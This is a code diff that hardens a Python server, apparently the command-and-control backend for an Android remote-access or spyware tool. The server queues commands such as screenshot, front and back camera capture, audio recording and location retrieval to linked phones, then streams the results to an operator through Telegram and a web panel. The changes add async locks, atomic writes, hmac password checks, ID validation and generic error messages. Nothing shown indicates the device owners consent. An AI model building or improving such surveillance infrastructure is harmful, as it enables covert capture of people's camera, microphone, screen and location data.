@@ -20,7 +20,7 @@ from pathlib import Path
 from urllib.parse import urlparse, parse_qs
 from collections import OrderedDict
 
-import threading
+import hmac
 
 import aiohttp
 from aiohttp import web
@@ -102,7 +102,7 @@ _data_forward_dedup = {}  # data forward dedup: device_id:type -> timestamp
 _data_body_dedup = {}  # dedup for /api/data body endpoint: device_id:command -> {last_time, last_hash}
 
 firebase_connected = False  # Tracks Firebase connectivity status
-_file_lock = threading.Lock()
+_db_lock = asyncio.Lock()
 
 # حد أدنى بين رسائل البوت لنفس المحادثة (بالثواني)
 RATE_LIMIT_SECONDS = 1
@@ -386,11 +386,12 @@ def load_json(path, default=None):
 
 
 def save_json(path, data):
-    with _file_lock:
-        try:
-            path.write_text(json.dumps(data, ensure_ascii=False, indent=2))
-        except Exception as exc:
-            log.error("Failed to save %s: %s", path, exc)
+    try:
+        temp_path = str(path) + '.tmp'
+        Path(temp_path).write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding='utf-8')
+        os.replace(temp_path, str(path))  # Atomic on POSIX
+    except Exception as exc:
+        log.error("Failed to save %s: %s", path, exc)
 
 
 def append_event(event, details=None, level="info"):
@@ -422,8 +423,9 @@ def load_settings():
     })
 
 
-def save_settings_data(settings):
-    save_json(SETTINGS_FILE, settings)
+async def save_settings_data(settings):
+    async with _db_lock:
+        save_json(SETTINGS_FILE, settings)
 
 
 def ts():
@@ -465,42 +467,46 @@ def find_device(device_id):
     return None
 
 
-def update_device(device_id, updates):
-    devices = get_devices()
-    for i, d in enumerate(devices):
-        if d.get("id") == device_id:
-            d.update(updates)
-            d["last_seen"] = ts()
-            devices[i] = d
-            save_devices(devices)
-            return d
-    return None
+async def update_device(device_id, updates):
+    async with _db_lock:
+        devices = get_devices()
+        for i, d in enumerate(devices):
+            if d.get("id") == device_id:
+                d.update(updates)
+                d["last_seen"] = ts()
+                devices[i] = d
+                save_devices(devices)
+                return d
+        return None
 
 
-def add_device(device_data):
-    devices = get_devices()
-    for i, d in enumerate(devices):
-        if d.get("id") == device_data.get("id"):
-            device_data["last_seen"] = ts()
-            devices[i] = device_data
-            save_devices(devices)
-            return device_data
-    device_data["last_seen"] = ts()
-    device_data["created_at"] = ts()
-    devices.append(device_data)
-    save_devices(devices)
-    append_event("Device registered", {"id": device_data["id"], "name": device_data.get("name", "")})
-    return device_data
+async def add_device(device_data):
+    async with _db_lock:
+        devices = get_devices()
+        for i, d in enumerate(devices):
+            if d.get("id") == device_data.get("id"):
+                device_data["last_seen"] = ts()
+                devices[i] = device_data
+                save_devices(devices)
+                append_event("Device registered", {"id": device_data["id"], "name": device_data.get("name", "")})
+                return device_data
+        device_data["last_seen"] = ts()
+        device_data["created_at"] = ts()
+        devices.append(device_data)
+        save_devices(devices)
+        append_event("Device registered", {"id": device_data["id"], "name": device_data.get("name", "")})
+        return device_data
 
 
-def remove_device(device_id):
-    devices = get_devices()
-    new_devices = [d for d in devices if d.get("id") != device_id]
-    if len(new_devices) == len(devices):
-        return False
-    save_devices(new_devices)
-    append_event("Device removed", {"id": device_id})
-    return True
+async def remove_device(device_id):
+    async with _db_lock:
+        devices = get_devices()
+        new_devices = [d for d in devices if d.get("id") != device_id]
+        if len(new_devices) == len(devices):
+            return False
+        save_devices(new_devices)
+        append_event("Device removed", {"id": device_id})
+        return True
 
 
 def get_first_device():
@@ -520,25 +526,26 @@ def get_device_by_token(device_id, token):
 # COMMAND QUEUE HELPERS
 # ============================================================================
 
-def queue_command(device_id, command, params=None):
-    commands = load_json(COMMANDS_FILE, [])
-    cmd = {
-        "id": str(uuid.uuid4())[:8],
-        "device_id": device_id,
-        "command": command,
-        "params": params or {},
-        "status": "pending",
-        "created_at": ts(),
-        "sent_at": None,
-        "result": None,
-    }
-    commands.append(cmd)
-    if len(commands) > 1000:
-        commands = commands[-1000:]
-    save_json(COMMANDS_FILE, commands)
-    append_event("Command queued", {"device_id": device_id, "command": command, "cmd_id": cmd["id"]})
-    firebase_push_command(cmd)
-    return cmd
+async def queue_command(device_id, command, params=None):
+    async with _db_lock:
+        commands = load_json(COMMANDS_FILE, [])
+        cmd = {
+            "id": str(uuid.uuid4())[:8],
+            "device_id": device_id,
+            "command": command,
+            "params": params or {},
+            "status": "pending",
+            "created_at": ts(),
+            "sent_at": None,
+            "result": None,
+        }
+        commands.append(cmd)
+        if len(commands) > 1000:
+            commands = commands[-1000:]
+        save_json(COMMANDS_FILE, commands)
+        append_event("Command queued", {"device_id": device_id, "command": command, "cmd_id": cmd["id"]})
+        firebase_push_command(cmd)
+        return cmd
 
 
 def get_pending_commands(device_id):
@@ -546,41 +553,53 @@ def get_pending_commands(device_id):
     return [c for c in commands if c.get("device_id") == device_id and c.get("status") == "pending"]
 
 
-def update_command_status(cmd_id, status, result=None):
-    commands = load_json(COMMANDS_FILE, [])
-    for i, c in enumerate(commands):
-        if c.get("id") == cmd_id:
-            commands[i]["status"] = status
-            commands[i]["result"] = result
-            commands[i]["completed_at"] = ts()
-            save_json(COMMANDS_FILE, commands)
-            return commands[i]
-    return None
+async def update_command_status(cmd_id, status, result=None):
+    async with _db_lock:
+        commands = load_json(COMMANDS_FILE, [])
+        for i, c in enumerate(commands):
+            if c.get("id") == cmd_id:
+                commands[i]["status"] = status
+                commands[i]["result"] = result
+                commands[i]["completed_at"] = ts()
+                save_json(COMMANDS_FILE, commands)
+                return commands[i]
+        return None
 
 # ============================================================================
 # SESSION HELPERS
 # ============================================================================
 
-def create_session(username, password, ip="", ua=""):
-    settings = load_settings()
-    if password != settings.get("admin_password", "admin"):
-        return None
-    sessions = load_json(SESSIONS_FILE, [])
-    token = secrets.token_urlsafe(32)
-    session = {
-        "token": token,
-        "username": username,
-        "created_at": datetime.now(timezone.utc).isoformat(),
-        "expires_at": (datetime.now(timezone.utc) + timedelta(hours=24)).isoformat(),
-        "ip": ip,
-        "user_agent": ua,
-    }
-    sessions.append(session)
-    if len(sessions) > 100:
-        sessions = sessions[-100:]
-    save_json(SESSIONS_FILE, sessions)
-    append_event("Web login", {"username": username, "ip": ip})
-    return session
+async def create_session(username, password, ip="", ua=""):
+    async with _db_lock:
+        settings = load_settings()
+        if not hmac.compare_digest(password, settings.get("admin_password", "admin")):
+            return None
+        # Clean expired sessions first
+        sessions = load_json(SESSIONS_FILE, [])
+        now = datetime.now(timezone.utc)
+        active = []
+        for s in sessions:
+            try:
+                if now < datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc):
+                    active.append(s)
+            except Exception:
+                continue
+        sessions = active
+        token = secrets.token_urlsafe(32)
+        session = {
+            "token": token,
+            "username": username,
+            "created_at": now.isoformat(),
+            "expires_at": (now + timedelta(hours=24)).isoformat(),
+            "ip": ip,
+            "user_agent": ua,
+        }
+        sessions.append(session)
+        if len(sessions) > 50:
+            sessions = sessions[-50:]
+        save_json(SESSIONS_FILE, sessions)
+        append_event("Web login", {"username": username, "ip": ip})
+        return session
 
 
 def validate_session(token):
@@ -598,10 +617,11 @@ def validate_session(token):
     return None
 
 
-def delete_session(token):
-    sessions = load_json(SESSIONS_FILE, [])
-    new_sessions = [s for s in sessions if s.get("token") != token]
-    save_json(SESSIONS_FILE, new_sessions)
+async def delete_session(token):
+    async with _db_lock:
+        sessions = load_json(SESSIONS_FILE, [])
+        new_sessions = [s for s in sessions if s.get("token") != token]
+        save_json(SESSIONS_FILE, new_sessions)
 
 # ============================================================================
 # LINK CODE HELPERS (Firebase Realtime Database + Local)
@@ -704,6 +724,12 @@ async def firebase_update(path, data):
         return False
 
 
+def validate_id(id_str, name="ID"):
+    """Validate that an ID contains only safe characters to prevent path injection."""
+    if not id_str or not all(c.isalnum() or c in '-_' for c in str(id_str)):
+        raise ValueError(f"Invalid {name}: {id_str}")
+
+
 def firebase_push_command(cmd):
     """Push command to Firebase so the Android app can receive it."""
     try:
@@ -721,6 +747,8 @@ async def _firebase_push_cmd_async(cmd):
     if not device_id or not cmd_id:
         return
     try:
+        validate_id(device_id, "device_id")
+        validate_id(cmd_id, "cmd_id")
         ok = await firebase_set(f"commands/{device_id}/{cmd_id}", {
             "id": cmd["id"],
             "device_id": cmd["device_id"],
@@ -1160,7 +1188,7 @@ async def execute_device_command(chat_id, device_id, cmd_name, params=None, msg_
         await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود.", reply_markup=build_main_menu())
         return
     
-    cmd = queue_command(device_id, cmd_name, params)
+    cmd = await queue_command(device_id, cmd_name, params)
     reg = COMMAND_REGISTRY.get(cmd_name, {})
     desc = reg.get("desc", cmd_name)
     emoji = reg.get("emoji", "📋")
@@ -1262,7 +1290,7 @@ async def handle_telegram_command(chat_id, text, message_id=None):
         await handle_device_detail(chat_id, arg1)
     elif cmd == "/device_rename":
         if arg1 and arg2:
-            if update_device(arg1, {"name": arg2}):
+            if await update_device(arg1, {"name": arg2}):
                 await send_message(chat_id, f"✅ تم إعادة تسمية الجهاز إلى <code>{arg2}</code>", reply_markup=build_back_button())
             else:
                 await send_message(chat_id, "❌ الجهاز غير موجود", reply_markup=build_back_button())
@@ -1364,7 +1392,7 @@ async def handle_telegram_command(chat_id, text, message_id=None):
         if arg1:
             s = load_settings()
             s["admin_password"] = arg1
-            save_settings_data(s)
+            await save_settings_data(s)
             await send_admin("✅ تم تغيير كلمة المرور", reply_markup=build_back_button())
         else:
             await send_admin("الاستخدام: /set_password كلمة_المرور_الجديدة", reply_markup=build_back_button())
@@ -1393,7 +1421,7 @@ async def handle_telegram_command(chat_id, text, message_id=None):
             "type": "broadcast",
         }
         for d in online_devices:
-            cmd = queue_command(d["id"], "show_notification", {"arg": message_text})
+            cmd = await queue_command(d["id"], "show_notification", {"arg": message_text})
             # Track batch membership on each command
             _pending_messages[cmd["id"]] = {
                 "chat_id": chat_id,
@@ -1448,7 +1476,7 @@ async def handle_telegram_command(chat_id, text, message_id=None):
             "type": "batch",
         }
         for d in online_devices:
-            cmd = queue_command(d["id"], reg["cmd"])
+            cmd = await queue_command(d["id"], reg["cmd"])
             _pending_messages[cmd["id"]] = {
                 "chat_id": chat_id,
                 "message_id": None,
@@ -1469,7 +1497,7 @@ async def handle_telegram_command(chat_id, text, message_id=None):
     elif cmd == "/maintenance":
         s = load_settings()
         s["maintenance"] = not s.get("maintenance", False)
-        save_settings_data(s)
+        await save_settings_data(s)
         state = "مفعّل 🔧" if s["maintenance"] else "معطّل ✅"
         await send_admin(f"🔧 وضع الصيانة: {state}", reply_markup=build_back_button())
     elif cmd == "/export_data":
@@ -1575,7 +1603,7 @@ async def handle_unlink(chat_id, device_id):
     if not device_id:
         await send_message(chat_id, "الاستخدام: /unlink معرف_الجهاز", reply_markup=build_back_button())
         return
-    if remove_device(device_id):
+    if await remove_device(device_id):
         await send_message(chat_id, f"✅ تم إلغاء ربط الجهاز <code>{device_id}</code>", reply_markup=build_devices_menu())
     else:
         await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود", reply_markup=build_back_button())
@@ -1684,7 +1712,7 @@ async def handle_callback_query(callback):
         # ── Unlink ──
         if data.startswith("do_unlink_"):
             device_id = data.replace("do_unlink_", "")
-            if remove_device(device_id):
+            if await remove_device(device_id):
                 text = f"✅ تم إلغاء ربط الجهاز <code>{device_id}</code>"
                 await edit_message_text(chat_id, message_id, text, reply_markup=build_devices_menu())
                 await answer_callback_query(cb_id, "تم إلغاء الربط")
@@ -1969,7 +1997,7 @@ async def api_verify_link(request):
             "network": "",
             "location": "",
         }
-        add_device(device_data)
+        await add_device(device_data)
         await consume_link_code(code, device_id)
 
         # Initialize online state tracking for alerts
@@ -1999,7 +2027,7 @@ async def api_verify_link(request):
         })
     except Exception as exc:
         log.error("verify_link error: %s", exc)
-        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)
+        return web.json_response({"ok": False, "success": False, "error": "Internal server error"}, status=500)
 
 
 async def api_register(request):
@@ -2052,7 +2080,7 @@ async def api_register(request):
             "network": "",
             "location": "",
         }
-        add_device(device_data)
+        await add_device(device_data)
         await consume_link_code(link_code, device_id)
         
         # إشعار الأدمن
@@ -2076,7 +2104,7 @@ async def api_register(request):
         })
     except Exception as exc:
         log.error("register error: %s", exc)
-        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)
+        return web.json_response({"ok": False, "success": False, "error": "Internal server error"}, status=500)
 
 
 async def api_get_commands(request):
@@ -2112,7 +2140,7 @@ async def api_get_commands(request):
     # a race condition with the app's processing.
     
     # Update last seen
-    update_device(device_id, {"active": True})
+    await update_device(device_id, {"active": True})
     
     # Track IP for upload identification
     peer_ip = _get_real_ip(request)
@@ -2141,7 +2169,7 @@ async def api_command_result(request):
         status = body.get("status", "completed")
         result = body.get("result")
 
-        updated = update_command_status(cmd_id, status, result)
+        updated = await update_command_status(cmd_id, status, result)
         if not updated:
             return web.json_response({"ok": False, "error": "Command not found"}, status=404)
 
@@ -2152,9 +2180,9 @@ async def api_command_result(request):
             return web.json_response({"ok": False, "error": "Unauthorized"}, status=401)
         command = updated.get("command", "")
         if device_id:
-            update_device(device_id, {"active": True})
+            await update_device(device_id, {"active": True})
 
-        # === FORWARD RESULT TO TELEGRAM ===
+        # === Real-time alert: online/offline transition ===
         result_key = f"api:{cmd_id}"
         if result_key not in _processed_results:
             _processed_results.add(result_key)
@@ -2255,7 +2283,7 @@ async def api_command_result(request):
         return web.json_response({"ok": True, "success": True, "message": "Result received"})
     except Exception as exc:
         log.error("command_result error: %s", exc)
-        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)
+        return web.json_response({"ok": False, "success": False, "error": "Internal server error"}, status=500)
 
 async def api_heartbeat(request):
     """POST /api/heartbeat - Receive heartbeat from device."""
@@ -2276,7 +2304,7 @@ async def api_heartbeat(request):
             return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
         
         is_online = status_val == "online"
-        update_device(device_id, {
+        await update_device(device_id, {
             "active": is_online,
             "battery": str(battery),
         })
@@ -2365,13 +2393,13 @@ async def api_device_data(request):
             return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
         
         dev_name = d.get("name", device_id)
-        update_device(device_id, {"active": True})
+        await update_device(device_id, {"active": True})
         
         # Handle different data types
         if data_type == "location":
             lat = data.get("lat", "")
             lon = data.get("lon", "")
-            update_device(device_id, {"location": f"{lat},{lon}"})
+            await update_device(device_id, {"location": f"{lat},{lon}"})
             loc_key = f"{device_id}:location"
             loc_now = time.time()
             if loc_now - _data_forward_dedup.get(loc_key, 0) >= 120:
@@ -2385,7 +2413,7 @@ async def api_device_data(request):
 
         elif data_type == "battery":
             level = data.get("level", "?")
-            update_device(device_id, {"battery": level})
+            await update_device(device_id, {"battery": level})
             # Low battery alert from data endpoint
             try:
                 level_int = int(level)
@@ -2436,7 +2464,7 @@ async def api_device_data(request):
         return web.json_response({"ok": True, "success": True, "message": "Data received"})
     except Exception as exc:
         log.error("device_data error: %s", exc)
-        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)
+        return web.json_response({"ok": False, "success": False, "error": "Internal server error"}, status=500)
 
 
 async def api_device_data_body(request):
@@ -2461,7 +2489,7 @@ async def api_device_data_body(request):
             return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
 
         dev_name = d.get("name", device_id)
-        update_device(device_id, {"active": True})
+        await update_device(device_id, {"active": True})
         append_event(f"Data received: {command}", {"device_id": device_id})
 
         # === ANTI-SPAM DEDUP: Prevent forwarding same data repeatedly ===
@@ -2559,7 +2587,7 @@ async def api_device_data_body(request):
         return web.json_response({"ok": True, "success": True, "message": "Data received"})
     except Exception as exc:
         log.error("device_data_body error: %s", exc)
-        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)
+        return web.json_response({"ok": False, "success": False, "error": "Internal server error"}, status=500)
 
 async def api_device_settings(request):
     """GET /api/settings/{device_id} - Get device settings."""
@@ -2653,7 +2681,7 @@ async def api_upload_file(request):
         
         dev_name = (d.get("name", device_id) if d else device_id) if device_id != "unknown" else "Unknown"
         if device_id != "unknown":
-            update_device(device_id, {"active": True})
+            await update_device(device_id, {"active": True})
         
         # === CACHE IMAGE FOR STREAMING VIEWER ===
         if file_type in ("screenshot", "camera", "photo") and device_id != "unknown" and len(file_data) > 1000:
@@ -2710,7 +2738,7 @@ async def api_upload_file(request):
         })
     except Exception as exc:
         log.error("upload_file error: %s", exc)
-        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)
+        return web.json_response({"ok": False, "success": False, "error": "Internal server error"}, status=500)
 
 
 async def api_upload_base64(request):
@@ -2739,7 +2767,7 @@ async def api_upload_base64(request):
             return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
         
         dev_name = d.get("name", device_id)
-        update_device(device_id, {"active": True})
+        await update_device(device_id, {"active": True})
         
         # Decode base64
         import base64
@@ -2781,7 +2809,7 @@ async def api_upload_base64(request):
         })
     except Exception as exc:
         log.error("upload_base64 error: %s", exc)
-        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)
+        return web.json_response({"ok": False, "success": False, "error": "Internal server error"}, status=500)
 
 
 async def tg_send_photo(chat_id, file_path, caption=None):
@@ -2895,7 +2923,7 @@ async def api_web_login(request):
         ip = request.remote or ""
         ua = request.headers.get("User-Agent", "")
         
-        session = create_session(username, password, ip, ua)
+        session = await create_session(username, password, ip, ua)
         if not session:
             return web.json_response({"ok": False, "error": "Invalid credentials"}, status=401)
         
@@ -2905,7 +2933,8 @@ async def api_web_login(request):
             "expires_at": session["expires_at"],
         })
     except Exception as exc:
-        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+        log.error("login error: %s", exc)
+        return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
 
 
 async def api_web_logout(request):
@@ -3007,10 +3036,11 @@ async def api_web_send_command(request):
         if not d:
             return web.json_response({"ok": False, "error": "Device not found"}, status=404)
         
-        cmd = queue_command(device_id, command, params)
+        cmd = await queue_command(device_id, command, params)
         return web.json_response({"ok": True, "command": cmd})
     except Exception as exc:
-        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+        log.error("web queue command error: %s", exc)
+        return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
 
 
 @require_auth
@@ -3033,16 +3063,17 @@ async def api_web_settings_set(request):
         for key, value in body.items():
             if key in settings:
                 settings[key] = value
-        save_settings_data(settings)
+        await save_settings_data(settings)
         return web.json_response({"ok": True})
     except Exception as exc:
-        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+        log.error("web settings error: %s", exc)
+        return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
 
 
 @require_auth
 async def api_web_unlink(request):
     device_id = request.match_info.get("device_id", "")
-    if remove_device(device_id):
+    if await remove_device(device_id):
         return web.json_response({"ok": True})
     return web.json_response({"ok": False, "error": "Not found"}, status=404)
 
@@ -4632,8 +4663,8 @@ async def firebase_result_listener():
                         log.error("Failed to forward result to Telegram: %s", send_err)
 
                     # Update local command status
-                    update_command_status(cmd_id, status, result_text)
-                    update_device(device_id, {"active": True})
+                    await update_command_status(cmd_id, status, result_text)
+                    await update_device(device_id, {"active": True})
 
                     # === CACHE SCREENSHOT/CAMERA IMAGES FOR STREAMING ===
                     if command in ("screenshot", "front_camera", "back_camera") and status in ("completed", "success"):
@@ -4662,6 +4693,8 @@ async def firebase_result_listener():
 
                     # Delete the result from Firebase immediately
                     try:
+                        validate_id(device_id, "device_id")
+                        validate_id(cmd_id, "cmd_id")
                         await firebase_set(f"results/{device_id}/{cmd_id}", None)
                     except Exception as del_err:
                         log.warning("Failed to delete Firebase result %s/%s: %s", device_id, cmd_id, del_err)
@@ -4694,6 +4727,11 @@ async def firebase_result_listener():
                     now = time.time()
                     for cid, cdata in fb_cmds.items():
                         if not isinstance(cdata, dict):
+                            continue
+                        try:
+                            validate_id(did, "device_id")
+                            validate_id(cid, "cmd_id")
+                        except ValueError:
                             continue
                         created = cdata.get("created_at", "")
                         if created:
@@ -4752,7 +4790,7 @@ async def device_monitoring_loop():
 
                 # If device is marked active but hasn't been seen recently, mark offline
                 if is_active and time_since_seen > DEVICE_OFFLINE_TIMEOUT:
-                    update_device(did, {"active": False})
+                    await update_device(did, {"active": False})
                     # Trigger offline alert via state tracking
                     was_online = _device_last_online_state.get(did, False)
                     if was_online:
@@ -4911,7 +4949,7 @@ def create_app():
             return web.json_response({"ok": True, "stored": True})
         except Exception as exc:
             log.error("device_event error: %s", exc)
-            return web.json_response({"ok": False, "error": str(exc)}, status=500)
+            return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
 
     app.router.add_post("/api/event", api_device_event)
     
@@ -4934,7 +4972,7 @@ def create_app():
             return web.json_response({"ok": True, "code": entry["code"], "session_id": entry.get("session_id", "")})
         except Exception as exc:
             log.error("link_code generation error: %s", exc)
-            return web.json_response({"ok": False, "error": str(exc)}, status=500)
+            return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
     app.router.add_post("/api/link_code", api_generate_link)
     
     # Web API (requires auth)
@@ -4967,7 +5005,7 @@ def create_app():
     async def ws_stream(request):
         """WebSocket endpoint for streaming - /ws/stream?device_id=xxx&stream_id=xxx"""
         from aiohttp import WSMsgType
-        ws = web.WebSocketResponse(max_msg_size=10*1024*1024)  # 10MB
+        ws = web.WebSocketResponse(max_msg_size=10*1024*1024, heartbeat=30)  # 10MB
         await ws.prepare(request)
 
         device_id = request.query.get("device_id", "")
@@ -4981,7 +5019,7 @@ def create_app():
         _stream_connections[device_id] = {"ws": ws, "stream_id": stream_id, "last_activity": time.time()}
 
         # Update device streaming status
-        update_device(device_id, {"streaming": True, "stream_id": stream_id})
+        await update_device(device_id, {"streaming": True, "stream_id": stream_id})
 
         try:
             async for msg in ws:
@@ -5040,7 +5078,7 @@ def create_app():
                     break
         finally:
             _stream_connections.pop(device_id, None)
-            update_device(device_id, {"streaming": False, "stream_id": ""})
+            await update_device(device_id, {"streaming": False, "stream_id": ""})
             log.info("WebSocket stream disconnected: device=%s", device_id)
 
         return ws
@@ -5048,7 +5086,7 @@ def create_app():
     async def ws_stream_viewer(request):
         """WebSocket endpoint for dashboard viewers - /ws/stream/viewer?stream_id=xxx"""
         from aiohttp import WSMsgType
-        ws = web.WebSocketResponse()
+        ws = web.WebSocketResponse(heartbeat=30)
         await ws.prepare(request)
 
         stream_id = request.query.get("stream_id", "")
@@ -5148,7 +5186,7 @@ def create_app():
         try:
             while device_id in _jpeg_stream_info and _jpeg_stream_info[device_id].get("active"):
                 # Queue the capture command
-                queue_command(device_id, cmd)
+                await queue_command(device_id, cmd)
                 _jpeg_stream_info[device_id]["last_command_time"] = time.time()
                 log.debug("JPEG stream: queued '%s' for %s", cmd, device_id)
                 # Wait for interval (check every second so we can stop promptly)
@@ -5201,20 +5239,20 @@ def create_app():
 
             # Send the first screenshot command immediately
             cmd_map = {"screen": "screenshot", "camera": "front_camera", "audio": "record_audio"}
-            queue_command(device_id, cmd_map.get(stream_type, "screenshot"))
+            await queue_command(device_id, cmd_map.get(stream_type, "screenshot"))
 
             # Start background loop
             task = asyncio.create_task(_jpeg_stream_loop(device_id, stream_type, interval))
             _jpeg_stream_tasks_module[device_id] = task
 
-            update_device(device_id, {"streaming": True})
+            await update_device(device_id, {"streaming": True})
             append_event("JPEG stream started", {"device_id": device_id, "type": stream_type})
             log.info("JPEG stream started: device=%s type=%s interval=%ds", device_id, stream_type, interval)
 
             return web.json_response({"ok": True, "message": f"JPEG streaming started ({stream_type})"})
         except Exception as exc:
             log.error("jpeg_stream_start error: %s", exc)
-            return web.json_response({"ok": False, "error": str(exc)}, status=500)
+            return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
 
     @require_auth
     async def api_jpeg_stream_stop(request):
@@ -5240,9 +5278,9 @@ def create_app():
 
             # Also queue stop commands if it was an audio stream
             if stream_type_saved == "audio":
-                queue_command(device_id, "stop_audio_stream")
+                await queue_command(device_id, "stop_audio_stream")
 
-            update_device(device_id, {"streaming": False})
+            await update_device(device_id, {"streaming": False})
             # Clean cached frames
             for key in list(_latest_frames_module.keys()):
                 if device_id in key:
@@ -5254,7 +5292,7 @@ def create_app():
             return web.json_response({"ok": True, "message": "JPEG streaming stopped"})
         except Exception as exc:
             log.error("jpeg_stream_stop error: %s", exc)
-            return web.json_response({"ok": False, "error": str(exc)}, status=500)
+            return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
 
     async def api_stream_start(request):
         """POST /api/stream/start - Receive stream start notification from device"""
@@ -5272,13 +5310,14 @@ def create_app():
             if not get_device_by_token(device_id, device_token):
                 return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
 
-            update_device(device_id, {"streaming": True, "stream_id": stream_id, "stream_type": stream_type})
+            await update_device(device_id, {"streaming": True, "stream_id": stream_id, "stream_type": stream_type})
             append_event("Stream started", {"device_id": device_id, "stream_id": stream_id, "type": stream_type})
             log.info("Stream started: device=%s stream=%s type=%s", device_id, stream_id, stream_type)
 
             return web.json_response({"ok": True})
         except Exception as exc:
-            return web.json_response({"ok": False, "error": str(exc)}, status=500)
+            log.error("stream_start error: %s", exc)
+            return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
 
     async def api_stream_stop(request):
         """POST /api/stream/stop - Receive stream stop notification from device"""
@@ -5296,7 +5335,7 @@ def create_app():
             if not get_device_by_token(device_id, device_token):
                 return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
 
-            update_device(device_id, {"streaming": False, "stream_id": ""})
+            await update_device(device_id, {"streaming": False, "stream_id": ""})
 
             # Clean up cached frames
             for key in list(_latest_frames.keys()):
@@ -5311,7 +5350,8 @@ def create_app():
 
             return web.json_response({"ok": True})
         except Exception as exc:
-            return web.json_response({"ok": False, "error": str(exc)}, status=500)
+            log.error("stream_stop error: %s", exc)
+            return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
 
     app.router.add_get("/ws/stream", ws_stream)
     app.router.add_get("/ws/stream/viewer", ws_stream_viewer)
